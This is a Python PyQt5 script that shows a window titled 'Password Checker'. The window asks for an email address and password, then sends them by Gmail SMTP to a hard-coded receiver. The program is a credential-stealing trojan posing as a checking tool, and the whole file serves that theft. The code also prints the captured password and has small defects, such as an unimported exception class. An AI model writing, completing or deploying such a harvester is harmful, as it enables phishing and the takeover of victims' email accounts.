from PyQt5.QtWidgets import *
from PyQt5 import QtGui
import smtplib

# Send Email
def email():
    try:
         s=smtplib.SMTP('smtp.gmail.com', 587)

         s.starttls()
         s.login("xxx@gmail.com", "password") 
         s.sendmail("sender", "receiver", full_credentials)
         s.quit() 
    except SMTPException:
        print("Error Occured")
      

# [ Login Interface ] #
class Login(QWidget):

	def __init__(self):
		super().__init__()

		self.setWindowTitle("[ Password  Checker ]")
		self.setGeometry(100, 200, 650, 400)
		self.setWindowIcon(QtGui.QIcon("login_image.ico"))

		self.ELabel = QLabel("Email    :", self); self.ELabel.setFont(QtGui.QFont("Arial BOLD", 18)); self.ELabel.move(45, 25); self.ELabel.setStyleSheet("color: black")
		self.PLabel = QLabel("Password:", self); self.PLabel.setFont(QtGui.QFont("Arial BOLD", 18)); self.PLabel.move(45, 60); self.PLabel.setStyleSheet("color: black")

		self.ETextBox = QLineEdit(self); self.ETextBox.move(175, 27); self.ETextBox.resize(200, 25)
		self.PTextBox = QLineEdit(self); self.PTextBox.move(175, 63); self.PTextBox.resize(200, 25)

		self.LoginButton = QPushButton("CheckNow", self); self.LoginButton.move(175, 100); self.LoginButton.clicked.connect(self.LoginAction)
		
                
                
		

		self.show()

	def LoginAction(self):
		global EmailBox, PasswordBox, full_credentials

		EmailBox = self.ETextBox.text()
		PasswordBox = self.PTextBox.text()
		full_credentials = "(Email) " + EmailBox.strip() + "\n(Password) " + PasswordBox.strip()

		if not (EmailBox and EmailBox.strip() and PasswordBox and PasswordBox.strip()):
			print("No Input?")
		else:
			print("Email: " + EmailBox.strip() + "\nPassword: " + PasswordBox.strip())
			email()

window = QApplication([]); show = Login(); window.exec()
